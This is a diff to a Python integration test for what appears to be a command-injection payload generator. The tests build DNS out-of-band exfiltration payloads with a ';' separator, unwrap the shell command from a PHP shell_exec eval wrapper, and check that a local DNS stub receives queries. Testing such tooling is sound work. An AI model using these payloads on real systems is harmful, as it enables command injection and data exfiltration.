@@ -37,6 +37,7 @@ import subprocess
 import sys
 import tempfile
 import threading
+import re
 import unittest
 import unittest.mock as mock
 
@@ -247,6 +248,18 @@ def _reassemble(stub_names):
 # ---------------------------------------------------------------------------
 # Integration test class
 # ---------------------------------------------------------------------------
+
+"""
+What the eval wrapper's literal holds, as the shell will see it.
+
+The command is carried as a single-quoted string of the language being evaluated rather than
+written into one the interpreter reads, so a '$' or a backtick of the pipeline's own reaches the
+shell instead of being read by the interpreter on the way. Unescaped here the way that language
+unescapes it.
+"""
+def _eval_inner(payload):
+    literal = re.search(r"shell_exec\('(.*)'\)\)", payload).group(1)
+    return re.sub(r"\\(['\\])", r"\1", literal)
 
 _TOOLS = ("sh", "od", "fold", "cat", "tr", "xargs", "python3")
 
@@ -480,8 +493,8 @@ class TestDnsOobIntegration(unittest.TestCase):
         # statement (PHP by default: print(`...`);).  The backtick content is
         # the same shell pipeline as the non-eval path.  Extract and run it.
         payload = payloads.exfiltrate_eval(";", "dns", HOSTNAME, "echo hello")
-        self.assertIn("`", payload, "eval wrapper not present: %r" % payload[:60])
-        inner_cmd = payload.split("`")[1]
+        self.assertIn("shell_exec(", payload, "eval wrapper not present: %r" % payload[:60])
+        inner_cmd = _eval_inner(payload)
         self._run(inner_cmd)
         names = self._stub.drain()
         self.assertNotEqual(names, [], "no DNS queries captured")
@@ -502,7 +515,7 @@ class TestDnsOobIntegration(unittest.TestCase):
         plain_names = set(self._stub.drain())
 
         eval_payload = payloads.exfiltrate_eval(";", "dns", HOSTNAME, "echo hello")
-        inner_cmd = eval_payload.split("`")[1]
+        inner_cmd = _eval_inner(eval_payload)
         self._run(inner_cmd)
         eval_names = set(self._stub.drain())
 
